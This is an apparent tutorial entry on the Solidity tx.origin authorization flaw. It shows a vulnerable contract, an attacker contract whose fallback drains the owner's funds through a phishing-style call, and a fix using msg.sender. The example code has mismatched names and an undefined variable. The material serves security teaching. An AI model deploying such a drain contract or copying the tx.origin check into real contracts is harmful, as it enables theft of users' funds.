# Authorization through `tx.origin`

Solidity has a global variable, `tx.origin` which traverses the entire call stack and returns the `address of the account` that originally sent the call (or transaction). Using this variable for authentication in smart contracts leaves the contract vulnerable to a `phishing-like attack`.


![image](https://user-images.githubusercontent.com/82324643/208300173-c3740287-97b5-4228-89e9-6306fca8fcb1.png)



#### Contract


    contract MyContract {

        address owner;

        function MyContract() public {
            owner = msg.sender;
        }

        function sendTo(address receiver, uint amount) public {
            require(tx.origin == owner);
            receiver.transfer(amount);
        }

       }
    
    
#### Attacker contract

contract Attacker {

    MyContract public myContract;
    function AttackingContract(MyContract myContractAddress) external {
        myContract = MyContract(myContractAddress);
        
    }

    fallback () public {
        myContract.sendTo(attacker, msg.sender.balance);
      }

    }
    
    
To utilise this contract, an attacker would deploy it, and then convince the owner of the Phishable contract to send this contract some amount of ether. The attacker may disguise this contract as their own private address and social engineer the victim to send some form of transaction to the address. The victim, unless being careful, may not notice that there is code at the `attacker's address`.

In any case, if the victim sends a transaction (with enough gas) to the AttackContract address, it will invoke the fallback function, which in turn calls the `sentTo()` function of the `Phishable contract`, with the parameter attacker. This will result in the withdrawal of all funds from the Phishable contract to the attacker address. This is because the address that first initialised the call was the victim (i.e. the owner of the Phishable contract). Therefore, `tx.origin` will be equal to owner and the `Phishable contract` will pass.


### prevent technique

you should use `msg.sender` for authorization (if another contract calls your contract `msg.sender` will be the address of the contract and not the address of the user who called the contract).
